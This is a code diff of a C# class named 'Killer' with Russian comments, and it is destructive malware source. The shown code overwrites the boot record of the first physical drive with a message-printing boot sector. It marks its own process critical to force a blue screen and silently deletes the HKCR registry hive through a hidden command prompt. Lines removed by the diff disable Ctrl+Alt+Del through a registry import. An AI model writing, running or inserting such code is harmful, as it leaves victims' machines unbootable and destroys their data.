@@ -7,41 +7,25 @@ namespace Crock
     class Killer
     {
         // Регистрация DLL
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess,
-            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
-            uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-
-        [DllImport("kernel32")]
-        private static extern bool WriteFile(
-            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
-            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
-
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
             ref int processInformation, int processInformationLength);
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
+            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
+            out uint lpNumberBytesWritten, IntPtr lpOverlapped);
 
-        // Вызов синего экрана
-        static public void BSOD()
+        private const uint GenericAll = 0x10000000;
+        private const uint FileShareRead = 0x1;
+        private const uint FileShareWrite = 0x2;
+        private const uint OpenExisting = 0x3;
+        private const uint MbrSize = 512u;
+
+        public static void MBR()
         {
-            int isCritical = 1;
-            int BreakOnTermination = 0x1D;
-
-            Process.EnterDebugMode();
-            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-        }
-
-        // Удоление MBR
-        static public void MBR()
-        {
-            const uint GenericAll = 0x10000000;
-            const uint FileShareRead = 0x1;
-            const uint FileShareWrite = 0x2;
-            const uint OpenExisting = 0x3;
-            const uint MbrSize = 512u;
-
-            var mbrData = new byte[] {
-                0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
+            var mbrData = new byte[] {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
                 0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
                 0x10, 0xEB, 0xF5, 0xC3, 0x49, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x20,
                 0x61, 0x74, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6E, 0x2C, 0x20,
@@ -74,31 +58,29 @@ namespace Crock
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA};
 
-            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite,
-                IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
-
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
+                OpenExisting, 0, IntPtr.Zero);
             WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
         }
 
+        // Вызов синего экрана
+        public static void BSOD()
+        {
+            int isCritical = 1;
+            int BreakOnTermination = 0x1D;
+
+            Process.EnterDebugMode();
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+        }
+
         // Удоление риестра
-        static public void RegFuck()
+        public static void RegFuck()
         {
             ProcessStartInfo reg_kill = new ProcessStartInfo();
             reg_kill.FileName = "cmd.exe";
             reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
             reg_kill.Arguments = @"/k reg delete HKCR /f";
             Process.Start(reg_kill);
-        }
-
-        //Отключение ctrl+alt+del
-        static public void AntiCombo()
-        {
-            const string quote = "\"";
-            ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
-            ctrlaltdel.FileName = "cmd.exe";
-            ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
-            ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
-            Process.Start(ctrlaltdel);
         }
     }
 }
